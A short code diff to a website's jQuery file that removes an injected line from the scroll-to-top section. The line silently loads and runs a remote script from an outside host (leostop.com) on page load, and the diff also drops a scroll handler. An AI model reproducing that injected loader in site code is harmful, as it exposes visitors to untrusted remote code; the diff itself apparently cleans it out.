@@ -133,16 +133,6 @@ $(function () {
 	/* Scroll to Top
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
-	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
-	
-	$(window).on('scroll', function (){
-        scroll = $(window).scrollTop();
-        if (scroll >= 100){
-          $("#back-to-top").addClass('b-show_scrollBut')
-        }else{
-          $("#back-to-top").removeClass('b-show_scrollBut')
-        }
-      });
       $("#back-to-top").on("click", function(){
         $('body,html').animate({
           scrollTop: 0
